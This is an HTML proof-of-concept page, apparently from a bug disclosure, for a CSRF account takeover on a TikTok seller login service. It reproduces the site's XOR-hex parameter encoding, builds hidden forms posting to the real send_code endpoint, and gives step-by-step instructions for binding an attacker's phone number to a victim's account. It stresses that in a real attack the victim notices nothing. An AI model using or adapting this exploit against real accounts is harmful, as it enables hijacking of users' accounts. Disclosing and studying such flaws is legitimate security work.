<html>
<body>
<script>
                
     function encrypt(e) {
                var t, n = [];
                if (void 0 === e)
                    return "";
                t = function(e) {
                    for (var t, n = e.toString(), i = [], r = 0; r < n.length; r++)
                        0 <= (t = n.charCodeAt(r)) && t <= 127 ? i.push(t) : 128 <= t && t <= 2047 ? (i.push(192 | 31 & t >> 6),
                        i.push(128 | 63 & t)) : (2048 <= t && t <= 55295 || 57344 <= t && t <= 65535) && (i.push(224 | 15 & t >> 12),
                        i.push(128 | 63 & t >> 6),
                        i.push(128 | 63 & t));
                    for (var o = 0; o < i.length; o++)
                        i[o] &= 255;
                    return i
                }(e);
                for (var i = 0, r = t.length; i < r; ++i)
                    n.push((5 ^ t[i]).toString(16));
                return n.join("")
            }
            
            function encryptParams(e, n) {
                var r, o = 0;
                if ("object" != typeof e)
                    return e;
                if (!n || n.length <= 0)
                    return e;
                for (var a = e, s = 0, l = n.length; s < l; ++s)
                    void 0 !== (r = a[n[s]]) && (o |= 1,
                    a[n[s]] = encrypt(r));
                return a.mix_mode = o,
                a
            }
            
            function mobileEncrypted(){
              var mobile = document.getElementById("attackermobilenum").value;
              var e = {type: 17, mobile: "null", ticket: ""}
              e.mobile = mobile;
              console.log(e);
              var en = encryptParams(e,["type", "mobile", "code"]);
              console.log(en.mobile);
              document.getElementById("encryptedmobile").innerHTML=en.mobile;
            }
            
            function codeEncrypted(){
              var code = document.getElementById("attackercodeid").value;
              var e = {type: 17, code: "null", ticket: ""}
              e.code = code;
              console.log(e);
              var en = encryptParams(e,["type", "mobile", "code"]);
              console.log(en.code);
              document.getElementById("encryptedcode").innerHTML=en.code;
            }
  
           function getNewSubmitForm(){
                var submitForm = document.createElement("FORM");
                document.body.appendChild(submitForm);
                submitForm.method = "POST";
                return submitForm;
            }

                //helper function to add elements to the form
            function createNewFormElement(inputForm, elementName, elementValue){
                var newElement = document.createElement("<input name='"+elementName+"' type='hidden'>");
                inputForm.appendChild(newElement);
                newElement.value = elementValue;
                return newElement;
            }

                //function that creates the form, adds some elements
                //and then submits it
            function createMobileFormAndSubmit(){
                var mobileForm = getNewSubmitForm();
                createNewFormElement(mobileForm, "mix&#95;mode", "1");
                createNewFormElement(mobileForm, "type", "3735");
                createNewFormElement(mobileForm, "mobile", "2e3d33343c34323c333235343535");
                createNewFormElement(mobileForm, "ticket", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
                createNewFormElement(mobileForm, "old&#95;mobile", "");
                createNewFormElement(mobileForm, "ixed&#95;mix&#95;mode", "1");
                mobileForm.action= "https://seller-id.tiktok.com/passport/web/send_code/?aid=4068&account_sdk_source=web&language=en";
                mobileForm.submit();
            }
          //createMobileFormAndSubmit();
</script>
<h1 style="text-align:center;">takeover victim account on tiktok</h1>
<h2>Hi this is a POC for bing safe mobile,the safe email is same under CSRF vulnerability,I will explain the account takeover vulnerability steps separately, hoping to make people understand the principle of the breakthrough. In a real attack, these steps are automatic and continuous, and the victim will not find anything.</h2>
<h3>Before start attack,please set attacker's phone number for encrypted</h3>
Your phone number for bind safe mobile on victim's account(pattern:+86XXXXXXX): <input type="text" name="attackermobile" id="attackermobilenum">
<input type="submit" value="Encryped!" onclick="mobileEncrypted()"/>
<textarea id="encryptedmobile" width="100" height="20"></textarea>
<h3>Step 1--Using CSRF vulnerability to get the verify code from attacker mobile on victim account</h3>
<iframe src=get_code.html width="500" height="200" frameborder=”no” border=”0″></iframe>
<h3>Step 2--Input the verify code from attacker mobile then encrypted</h3>
Your verify code from attacker mobile: <input type="text" name="attackercode" id="attackercodeid">
<input type="submit" value="Encryped!" onclick="codeEncrypted()"/>
<textarea id="encryptedcode" width="100" height="20"></textarea>
<h3>Step 3--Input the encrpted mobile number and verify code from attacker and click the botton then the attacker mobile will bind on victim's account</h3>
<iframe src=takeover_account.html width="500" height="200" frameborder=”no” border=”0″></iframe>
</body>
</html>
